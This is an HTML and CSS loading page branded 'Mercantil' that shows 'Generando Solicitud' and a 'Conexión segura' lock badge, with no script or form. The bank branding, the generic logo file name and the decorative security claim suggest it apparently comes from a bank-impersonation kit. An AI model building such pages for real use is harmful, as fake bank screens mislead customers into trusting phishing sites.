<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
    <title>Mercantil</title>

    <!-- Tipografía profesional -->
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html, body {
            height: 100%;
            width: 100%;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0a1428 0%, #0d1e3c 100%);
            overflow: hidden;
        }

        /* CONTENEDOR PRINCIPAL */
        .container {
            text-align: center;
            max-width: 420px;
            width: 100%;
            padding: 20px;
        }

        /* CARD */
        .card {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 48px 40px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        /* LOGO */
        .logo-wrapper {
            margin-bottom: 32px;
        }

        .logo {
            width: 72px;
            height: 72px;
            margin: 0 auto;
            border-radius: 10px;
            overflow: hidden;
            background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
            border: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeInScale 0.8s ease-out 0.1s both;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
        }

        .logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* INDICADOR DE CARGA */
        .loader {
            margin-bottom: 32px;
            height: 4px;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 2px;
            overflow: hidden;
            position: relative;
        }

        .loader::after {
            content: '';
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            width: 30%;
            background: linear-gradient(90deg, 
                rgba(59, 130, 246, 0) 0%, 
                rgba(59, 130, 246, 0.8) 50%, 
                rgba(59, 130, 246, 0) 100%);
            animation: loading 1.8s ease-in-out infinite;
        }

        /* TEXTO PRINCIPAL */
        .status-text {
            font-size: 15px;
            color: rgba(255, 255, 255, 0.85);
            font-weight: 500;
            letter-spacing: 0.2px;
            margin-bottom: 8px;
            animation: fadeIn 0.8s ease-out 0.2s both;
        }

        .status-dots {
            display: inline-block;
            width: 4px;
            animation: dots 1.4s steps(4, end) infinite;
        }

        /* INFORMACIÓN DE SEGURIDAD */
        .security-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.06);
            font-size: 12px;
            color: rgba(255, 255, 255, 0.6);
            animation: fadeIn 0.8s ease-out 0.4s both;
        }

        .security-icon {
            width: 14px;
            height: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .lock-icon {
            width: 10px;
            height: 12px;
            border: 1.5px solid rgba(59, 130, 246, 0.7);
            border-radius: 2px;
            position: relative;
        }

        .lock-icon::before {
            content: '';
            position: absolute;
            top: -5px;
            left: 50%;
            transform: translateX(-50%);
            width: 6px;
            height: 5px;
            border: 1.5px solid rgba(59, 130, 246, 0.7);
            border-bottom: none;
            border-radius: 6px 6px 0 0;
        }

        /* ANIMACIONES */
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes fadeInScale {
            from {
                opacity: 0;
                transform: scale(0.95);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @keyframes loading {
            0% {
                left: -100%;
            }
            100% {
                left: 100%;
            }
        }

        @keyframes dots {
            0% { content: ''; }
            33% { content: '.'; }
            66% { content: '..'; }
            100% { content: '...'; }
        }

        /* RESPONSIVE */
        @media (max-width: 480px) {
            .card {
                padding: 36px 24px;
            }

            .status-text {
                font-size: 14px;
            }

            .logo {
                width: 64px;
                height: 64px;
            }
        }

        /* PREFERS REDUCED MOTION */
        @media (prefers-reduced-motion: reduce) {
            * {
                animation-duration: 0.01ms !important;
                animation-iteration-count: 1 !important;
                transition-duration: 0.01ms !important;
            }
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="card">
            <div class="logo-wrapper">
                <div class="logo">
                    <img src="unnamed.webp" alt="Mercantil">
                </div>
            </div>

            <div class="loader"></div>

            <div class="status-text">
                Generando Solicitud<span class="status-dots"></span>
            </div>

            <div class="security-info">
                <div class="security-icon">
                    <div class="">🔒</div>
                </div>
                <span>Conexión segura</span>
            </div>
        </div>
    </div>
